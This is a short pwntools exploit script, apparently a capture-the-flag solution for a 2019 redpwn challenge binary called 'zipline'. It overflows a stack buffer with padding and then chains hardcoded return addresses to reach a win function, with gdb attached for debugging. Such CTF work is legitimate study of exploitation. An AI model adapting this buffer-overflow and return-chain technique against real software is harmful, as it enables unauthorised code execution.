from pwn import *

context.terminal = ['tmux','splitw','-h']

#p = remote('chall2.2019.redpwn.net','4005')
p = process('./zipline')

gdb.attach(proc.pidof(p)[0])

padding = "A"*18
padding += "B"*4


air = 0x08049216
water = 0x0804926d
land = 0x080492c4
underground = 0x0804931b
limbo = 0x08049372
hell = 0x080493c9
minecraft_nether = 0x08049420
bedrock = 0x08049477
#i_got_you = 0x08049569   success one  (return to main to call i_got_you)
i_got_you = 0x080a0101  # fail one 

payload =  p32(air)
payload += p32(water)
payload += p32(land)
payload += p32(underground)
payload += p32(limbo)
payload += p32(hell)
payload += p32(minecraft_nether)
payload += p32(bedrock)
payload += p32(i_got_you)

p.recvline()
p.sendline(padding + payload)



p.interactive()

